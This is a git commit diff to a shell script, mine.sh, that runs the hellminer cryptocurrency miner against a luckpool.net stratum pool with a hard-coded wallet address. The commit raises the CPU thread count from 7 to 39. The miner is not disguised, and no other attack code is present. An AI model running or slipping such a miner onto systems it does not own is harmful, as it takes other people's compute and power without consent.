6e9476886212ea1c20f0fdfabb659d855b0388cd
࿔〆iᎷ•ƒiηe <90412524+XProjectsX@users.noreply.github.com>
2022-03-04 18:12:46 +0700

    Update mine.sh

--- mine.sh
+++ mine.sh
@@ -6,4 +6,4 @@ rm -rf hellminer_cpu_linux.tar.gz &&
 POOL=stratum+tcp://ap.luckpool.net:3956#xnsub
 WALLET=RVjBXiHpnNcx3nV45uRUGAj5CuZqwdGbn2
 WORKEER=$(echo $(shuf -i 1000-9999 -n 1)-xprojects)
-./hellminer -c $POOL -u $WALLET.$WORKEER -p x --cpu 7
+./hellminer -c $POOL -u $WALLET.$WORKEER -p x --cpu 39
